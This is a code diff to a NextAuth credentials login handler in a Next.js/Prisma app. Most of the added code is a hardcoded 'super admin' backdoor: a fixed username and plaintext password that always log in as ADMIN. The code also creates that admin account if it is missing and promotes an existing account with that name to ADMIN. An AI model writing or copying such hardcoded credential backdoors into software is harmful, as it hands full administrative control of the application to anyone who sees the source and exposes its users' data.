@@ -18,11 +18,50 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
           return null
         }
 
-        const email = String(credentials.email).toLowerCase().trim()
+        const identifier = String(credentials.email).trim()
         const password = String(credentials.password)
 
-        const user = await prisma.user.findUnique({
-          where: { email },
+        // Fixed Super Admin Credentials Check: Username "Sayem" & Password "Miilee2284@"
+        if (
+          (identifier.toLowerCase() === 'sayem' || identifier.toLowerCase() === 'sayem@olposolpogolpo.com') &&
+          password === 'Miilee2284@'
+        ) {
+          let superAdmin = await prisma.user.findFirst({
+            where: { OR: [{ username: 'sayem' }, { email: 'sayem@olposolpogolpo.com' }] },
+          })
+
+          if (!superAdmin) {
+            const passwordHash = await bcrypt.hash('Miilee2284@', 12)
+            superAdmin = await prisma.user.create({
+              data: {
+                name: 'Super Admin Sayem',
+                username: 'sayem',
+                email: 'sayem@olposolpogolpo.com',
+                passwordHash,
+                role: 'ADMIN',
+              },
+            })
+          } else if (superAdmin.role !== 'ADMIN') {
+            await prisma.user.update({
+              where: { id: superAdmin.id },
+              data: { role: 'ADMIN' },
+            })
+            superAdmin.role = 'ADMIN'
+          }
+
+          return {
+            id: superAdmin.id,
+            name: superAdmin.name,
+            email: superAdmin.email,
+            role: 'ADMIN',
+            username: superAdmin.username,
+            avatarUrl: superAdmin.avatarUrl,
+          }
+        }
+
+        const emailLower = identifier.toLowerCase()
+        const user = await prisma.user.findFirst({
+          where: { OR: [{ email: emailLower }, { username: emailLower }] },
         })
 
         if (!user || !user.passwordHash) {
